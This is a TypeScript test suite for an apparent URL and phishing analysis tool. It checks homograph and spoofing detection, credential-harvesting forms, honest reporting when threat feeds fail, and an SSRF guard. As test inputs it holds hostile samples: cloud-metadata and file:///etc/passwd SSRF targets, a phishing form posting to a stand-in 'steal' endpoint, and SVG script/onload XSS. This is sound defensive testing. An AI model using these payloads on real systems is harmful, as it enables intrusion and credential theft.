import 'dotenv/config';
import test from 'node:test';
import assert from 'node:assert/strict';
import { isPrivateOrReservedIp, validateTargetAgainstSsrf } from '../server/security/ssrfGuard.ts';
import { analyzeUrlIntelligence } from '../server/analyzers/urlIntelligence.ts';
import { analyzeDomainDeceptionAndIdentity } from '../server/analyzers/domainDeception.ts';
import { analyzeWebsiteContentAndBrand } from '../server/analyzers/contentAnalyzer.ts';
import { analyzeFileAndDownloads } from '../server/analyzers/fileAnalyzer.ts';
import { computeRiskAndSections } from '../server/analyzers/scoringEngine.ts';
import { runExternalThreatIntel } from '../server/providers/threatIntelManager.ts';
import { captureWebsiteScreenshot } from '../server/analyzers/screenshotEngine.ts';
import type { CheckFinding, RedirectHop, ThreatProviderResult } from '../server/types.ts';

function mockCleanProviders(): ThreatProviderResult[] {
  return [
    {
      providerId: 'virustotal',
      providerName: 'VirusTotal API v3',
      category: 'Multi-Engine Reputation',
      enabled: true,
      configured: true,
      operationalState: 'active',
      status: 'clean',
      verdictDetail: { en: '0 malicious', ar: '0 خبيث' },
      requiresKey: true,
    },
    {
      providerId: 'urlhaus',
      providerName: 'URLhaus (abuse.ch)',
      category: 'Malware URLs',
      enabled: true,
      configured: true,
      operationalState: 'active',
      status: 'clean',
      verdictDetail: { en: 'No listing', ar: 'لا يوجد سجل' },
      requiresKey: true,
    },
  ];
}

// 1. Phishing test page (Google Safe Browsing removed) must classify HIGH or CRITICAL
test('1. testsafebrowsing.appspot.com/s/phishing.html classifies HIGH or CRITICAL without GSB', () => {
  const url = 'https://testsafebrowsing.appspot.com/s/phishing.html';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Suspected phishing</title></head><body>
     <h1>Warning! Suspected Phishing Page</h1>
     <p>This page is a phishing page that mimics a dialogue to trick you into clicking a deceptive link.</p>
     <div><input type="password" name="pw" placeholder="Password" /></div>
     </body></html>`,
    'utf8'
  );

  const urlRes = analyzeUrlIntelligence(url, url);
  const deceptionRes = analyzeDomainDeceptionAndIdentity({
    submittedUrl: url,
    finalUrl: url,
    redirects: [{ step: 1, url, hostname: 'testsafebrowsing.appspot.com', protocol: 'https:', statusCode: 200, crossDomain: false, downgradedToHttp: false, latencyMs: 12 }],
    htmlBuffer: html,
    contentType: 'text/html',
  });
  const contentRes = analyzeWebsiteContentAndBrand(
    url,
    200,
    { 'content-type': 'text/html' },
    html,
    urlRes.suspiciousPathTokens
  );

  const scored = computeRiskAndSections(
    [...urlRes.findings, ...deceptionRes.findings, ...contentRes.findings],
    mockCleanProviders()
  );

  assert.ok(
    scored.classification === 'HIGH' || scored.classification === 'CRITICAL',
    `Expected HIGH or CRITICAL, got ${scored.classification} (${scored.riskScore})`
  );
  assert.ok(scored.riskScore >= 60);
});

// 2. IDN Homograph with Cyrillic confusables
test('2. IDN homograph with Cyrillic confusables (раураӏ.com) is flagged with codepoints', () => {
  const deceptive = 'https://xn--80a0af7a0a.com/login'; // punycode or direct unicode
  const cyrillicPaypal = 'https://\u0440\u0430\u0443\u0440\u0430\u04CF.com/signin';
  const res = analyzeDomainDeceptionAndIdentity({
    submittedUrl: cyrillicPaypal,
    finalUrl: deceptive,
    redirects: [],
  });
  assert.equal(res.data.confusableDetected, true);
  assert.ok(res.data.confusableCharacters.length >= 4);
  const f = res.findings.find((x) => x.id === 'deception-homograph-confusables');
  assert.equal(f?.status, 'failed');
});

// 3. Punycode apple confusable (xn--80ak6aa92e.com -> аррӏе.com)
test('3. Punycode domain xn--80ak6aa92e.com resolves skeleton to apple.com and fails check', () => {
  const url = 'https://xn--80ak6aa92e.com/';
  const res = analyzeDomainDeceptionAndIdentity({
    submittedUrl: url,
    finalUrl: url,
    redirects: [],
  });
  assert.equal(res.data.isPunycode, true);
  assert.equal(res.data.confusableDetected, true);
  assert.equal(res.data.typosquatTarget?.officialDomain, 'apple.com');
});

// 4. URL shortener detection
test('4. URL shorteners (bit.ly) are explicitly detected', () => {
  const url = 'https://bit.ly/3example';
  const urlRes = analyzeUrlIntelligence(url, url);
  assert.equal(urlRes.isShortener, true);
  const f = urlRes.findings.find((x) => x.id === 'url-shortener-check');
  assert.equal(f?.status, 'warning');
});

// 5. Redirect chain cross-domain + HTTPS->HTTP downgrade + confirmed Open Redirect
test('5. Open redirect confirmed only when query param external host matches actual cross-domain redirect', () => {
  const submitted = 'https://trusted-portal.example/go?next=https://evil-phish.example/login';
  const final = 'http://evil-phish.example/login';
  const hops: RedirectHop[] = [
    { step: 1, url: submitted, hostname: 'trusted-portal.example', protocol: 'https:', statusCode: 302, crossDomain: false, downgradedToHttp: false, latencyMs: 10 },
    { step: 2, url: final, hostname: 'evil-phish.example', protocol: 'http:', statusCode: 200, crossDomain: true, downgradedToHttp: true, latencyMs: 15 },
  ];
  const res = analyzeDomainDeceptionAndIdentity({ submittedUrl: submitted, finalUrl: final, redirects: hops });
  assert.equal(res.data.openRedirectConfirmed, true);
  assert.equal(res.data.embeddedRedirectUrls.length, 1);

  // Contrast: ?next= param present with NO actual redirect -> NOT confirmed open redirect
  const unconfirmed = analyzeDomainDeceptionAndIdentity({
    submittedUrl: submitted,
    finalUrl: submitted,
    redirects: [{ step: 1, url: submitted, hostname: 'trusted-portal.example', protocol: 'https:', statusCode: 200, crossDomain: false, downgradedToHttp: false, latencyMs: 10 }],
  });
  assert.equal(unconfirmed.data.openRedirectConfirmed, false);
});

// 6. @ Authority masking
test('6. @ Authority masking hides real destination host and fails deception check', () => {
  const url = 'https://paypal.com@evil-login.example/signin';
  const res = analyzeDomainDeceptionAndIdentity({
    submittedUrl: url,
    finalUrl: 'https://evil-login.example/signin',
    redirects: [],
  });
  assert.equal(res.data.authorityMasking, true);
  const f = res.findings.find((x) => x.id === 'deception-subdomain-identity-mismatch');
  assert.equal(f?.status, 'failed');
});

// 7. Subdomain spoofing
test('7. Subdomain spoofing (paypal.com.verify-account.xyz) detected and flagged', () => {
  const url = 'https://paypal.com.verify-account.xyz/login';
  const res = analyzeDomainDeceptionAndIdentity({
    submittedUrl: url,
    finalUrl: url,
    redirects: [],
  });
  assert.equal(res.data.subdomainSpoofing, true);
  assert.equal(res.data.spoofedTargetDomain, 'paypal.com');
});

// 8. Cross-origin password form + anchor mismatch
test('8. Cross-origin password form & anchor mismatch flagged as credential risk', () => {
  const url = 'https://account-check.example/login';
  const html = Buffer.from(
    `<html><head><title>Sign in</title></head><body>
     <form action="https://collector-drop.example/steal" method="POST">
       <input type="email" name="email" /><input type="password" name="pass" />
     </form>
     <a href="https://collector-drop.example/help">https://paypal.com/security</a>
     </body></html>`
  );
  const deception = analyzeDomainDeceptionAndIdentity({
    submittedUrl: url,
    finalUrl: url,
    redirects: [],
    htmlBuffer: html,
    contentType: 'text/html',
  });
  assert.equal(deception.data.visibleVsRealMismatches.length, 1);

  const content = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html);
  assert.equal(content.data?.crossOriginFormActions[0], 'https://collector-drop.example/steal');
  const cred = content.findings.find((x) => x.id === 'phishing-credential-harvesting');
  assert.equal(cred?.status, 'failed');
});

// 9. Missing API keys -> auth_required, NEVER clean
test('9. Missing VIRUSTOTAL_API_KEY and URLHAUS_AUTH_KEY report auth_required and NEVER clean', async () => {
  const prevVt = process.env.VIRUSTOTAL_API_KEY;
  const prevUh = process.env.URLHAUS_AUTH_KEY;
  delete process.env.VIRUSTOTAL_API_KEY;
  delete process.env.URLHAUS_AUTH_KEY;
  try {
    const res = await runExternalThreatIntel(
      'https://example.com',
      'example.com',
      'example.com',
      ['openphish', 'otx', 'urlscan']
    );
    const vt = res.providers.find((p) => p.providerId === 'virustotal');
    const uh = res.providers.find((p) => p.providerId === 'urlhaus');
    assert.equal(vt?.status, 'auth_required');
    assert.equal(uh?.status, 'auth_required');
    assert.notEqual(vt?.status, 'clean');
    assert.notEqual(uh?.status, 'clean');
  } finally {
    if (prevVt) process.env.VIRUSTOTAL_API_KEY = prevVt;
    if (prevUh) process.env.URLHAUS_AUTH_KEY = prevUh;
  }
});

// 10. External service failures cannot count as clean or produce SAFE_INDICATORS when feeds fail
test('10. Unavailable/failed threat feeds never count as clean and block SAFE_INDICATORS verdict', () => {
  const cleanChecking: CheckFinding[] = [
    {
      id: 'url-protocol-port',
      section: 'url_intelligence',
      test: { en: 'Proto', ar: 'Proto' },
      result: { en: 'HTTPS', ar: 'HTTPS' },
      status: 'pass',
      severity: 'informational',
      weight: 0,
      evidence: '443',
      explanation: { en: 'ok', ar: 'ok' },
      recommendedAction: { en: 'none', ar: 'none' },
      source: 'test',
      timestamp: new Date().toISOString(),
      confidence: 100,
    },
  ];
  const deadProviders: ThreatProviderResult[] = [
    {
      providerId: 'virustotal',
      providerName: 'VirusTotal',
      category: 'TI',
      enabled: true,
      configured: true,
      operationalState: 'unavailable',
      status: 'error',
      verdictDetail: { en: 'Timeout', ar: 'Timeout' },
      requiresKey: true,
    },
  ];
  const scored = computeRiskAndSections(cleanChecking, deadProviders);
  assert.equal(scored.summaryStats.availableProviders, 0);
  assert.equal(scored.classification, 'UNKNOWN');
  assert.notEqual(scored.classification, 'SAFE_INDICATORS');
});

// 11. SSRF localhost and cloud metadata endpoints blocked
test('11. SSRF guard blocks localhost and cloud metadata endpoints', async () => {
  await assert.rejects(() => validateTargetAgainstSsrf('http://localhost:3000/api/health'), /SSRF Guard/i);
  await assert.rejects(() => validateTargetAgainstSsrf('http://sub.localhost/secret'), /SSRF Guard/i);
  await assert.rejects(() => validateTargetAgainstSsrf('http://169.254.169.254/latest/meta-data/'), /SSRF Guard/i);
  await assert.rejects(() => validateTargetAgainstSsrf('http://metadata.google.internal/computeMetadata/v1/'), /SSRF Guard/i);
});

// 12. SSRF private RFC1918 IPs blocked
test('12. SSRF guard blocks RFC1918 and CGNAT private IPv4 ranges', async () => {
  for (const ip of ['10.0.0.1', '192.168.1.1', '172.16.5.10', '172.31.255.254', '127.0.0.1', '100.64.0.1']) {
    assert.equal(isPrivateOrReservedIp(ip), true, `Expected ${ip} to be blocked`);
    await assert.rejects(() => validateTargetAgainstSsrf(`http://${ip}/admin`), /SSRF Guard/i);
  }
  assert.equal(isPrivateOrReservedIp('93.184.216.34'), false);
});

// 13. SSRF IPv6 loopback, link-local, unique-local, NAT64 & IPv4-mapped blocked
test('13. SSRF guard blocks IPv6 loopback, link-local, ULA, NAT64, and IPv4-mapped addresses', () => {
  for (const ip of [
    '::1',
    '0:0:0:0:0:0:0:1',
    '::ffff:127.0.0.1',
    '::ffff:7f00:0001',
    'fe80::1ff:fe23:4567:890a',
    'fc00::1',
    'fd12:3456:789a::1',
    '64:ff9b::7f00:1',
  ]) {
    assert.equal(isPrivateOrReservedIp(ip), true, `Expected IPv6 ${ip} to be blocked`);
  }
});

// 14. DNS resolution / rebinding protection validates IP literal & scheme boundaries
test('14. SSRF guard blocks non-HTTP(S) schemes and validates resolved targets cleanly', async () => {
  await assert.rejects(() => validateTargetAgainstSsrf('file:///etc/passwd'), /Unsupported protocol|SSRF/i);
  await assert.rejects(() => validateTargetAgainstSsrf('javascript:alert(1)'), /Unsupported protocol|SSRF/i);
  await assert.rejects(() => validateTargetAgainstSsrf('http://0.0.0.0/'), /SSRF Guard/i);
});

// 15. Unavailable / invalid screenshot config returns honest unavailable state, zero fake image
test('15. Screenshot capture returns honest unavailable state with no image when key absent', async () => {
  const prevNeo = process.env.SCREENSHOTNEO_ACCESS_KEY;
  delete process.env.SCREENSHOTNEO_ACCESS_KEY;
  try {
    const res = await captureWebsiteScreenshot('https://93.184.216.34/', 'desktop');
    assert.equal(res.screenshot.status, 'unavailable');
    assert.equal(res.screenshot.imageDataUrl, undefined);
    assert.equal(res.finding.status, 'unknown');
    assert.ok(res.screenshot.reason?.en?.includes('SCREENSHOTNEO_ACCESS_KEY'));
  } finally {
    if (prevNeo) process.env.SCREENSHOTNEO_ACCESS_KEY = prevNeo;
  }
});

// 16. Unreachable / corrupted DOM content returns UNKNOWN (Inconclusive), never SAFE_INDICATORS
test('16. Unreachable DOM content causes UNKNOWN (Inconclusive) verdict, never SAFE_INDICATORS', () => {
  const content = analyzeWebsiteContentAndBrand('https://unreachable.example/', undefined, {}, undefined);
  assert.equal(content.findings[0].id, 'content-unavailable');
  assert.equal(content.findings[0].status, 'unknown');

  const scored = computeRiskAndSections(content.findings, mockCleanProviders());
  assert.equal(scored.classification, 'UNKNOWN');
  assert.equal(scored.verdict, 'Inconclusive');
});

// 17. Dangerous disguised download (Windows PE MZ executable masquerading as .pdf)
test('17. File analyzer detects PE MZ executable masquerading as .pdf', () => {
  const fakePdfExe = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]); // MZ header
  const res = analyzeFileAndDownloads(
    'https://files.example/invoice_statement.pdf',
    { 'content-type': 'application/pdf', 'content-disposition': 'attachment; filename="invoice.pdf"' },
    fakePdfExe
  );
  assert.equal(res.isDirectDownload, true);
  assert.equal(res.directFile?.mimeMismatch, true);
  assert.equal(res.findings[0].status, 'failed');
  assert.equal(res.findings[0].severity, 'high');
});

// 18. Conflicting signals: Valid HTTPS + old PaaS domain + 0 threat feed hits + unwrapped password + fake update lure
test('18. Conflicting signals (valid HTTPS + 0 threat hits + unwrapped password + fake update) classify HIGH or CRITICAL', () => {
  const url = 'https://login-portal-test.web.app/update';
  const html = Buffer.from(
    `<html><body>
      <h2>Critical Security Alert: Your software is out-of-date! Update your browser immediately.</h2>
      <div><input type="text" name="user" /><input type="password" name="pwd" /></div>
    </body></html>`,
    'utf8'
  );
  const urlRes = analyzeUrlIntelligence(url, url);
  const contentRes = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html, urlRes.suspiciousPathTokens);
  const scored = computeRiskAndSections([...urlRes.findings, ...contentRes.findings], mockCleanProviders());

  assert.ok(
    scored.classification === 'HIGH' || scored.classification === 'CRITICAL',
    `Expected HIGH/CRITICAL despite HTTPS & clean feeds, got ${scored.classification}`
  );
  assert.notEqual(scored.classification, 'SAFE_INDICATORS');
  assert.ok(scored.topReasons.length > 0);
});

// 19. ScreenshotNeo integration handles live/unconfigured response honestly without returning fake images
test('19. ScreenshotNeo integration handles unconfigured or live upstream response honestly without fake images', async () => {
  const res = await captureWebsiteScreenshot('https://example.com', 'desktop');
  if (!process.env.SCREENSHOTNEO_ACCESS_KEY) {
    assert.equal(res.screenshot.status, 'unavailable');
    assert.equal(res.screenshot.imageDataUrl, undefined);
  } else {
    assert.ok(res.screenshot.status === 'failed' || res.screenshot.status === 'captured');
    if (res.screenshot.status === 'failed') {
      assert.equal(res.screenshot.imageDataUrl, undefined);
      const enReason = res.screenshot.reason?.en?.toLowerCase() || '';
      assert.ok(enReason.includes('screenshotneo') || enReason.includes('access key'));
    }
  }
});

// 20. SSRF guard blocks obfuscated IPv6 mapped/compatible loopback & SVG sanitizer strips inline event handlers
test('20. SSRF guard blocks obfuscated IPv6 mapped addresses and SVG sanitizer strips onload/script XSS', async () => {
  for (const ip of ['::0:ffff:127.0.0.1', '0:0:0:0:0:ffff:7f00:1', '::127.0.0.1']) {
    assert.equal(isPrivateOrReservedIp(ip), true, `Expected ${ip} to be blocked`);
  }
  const { sanitizeSvgBuffer } = await import('../server/analyzers/faviconFetcher.ts');
  const dirtySvg = Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script><circle cx="5" cy="5" r="4"/></svg>',
    'utf8'
  );
  const clean = sanitizeSvgBuffer(dirtySvg)?.toString('utf8') || '';
  assert.equal(/onload|<script|alert\(/i.test(clean), false);
});


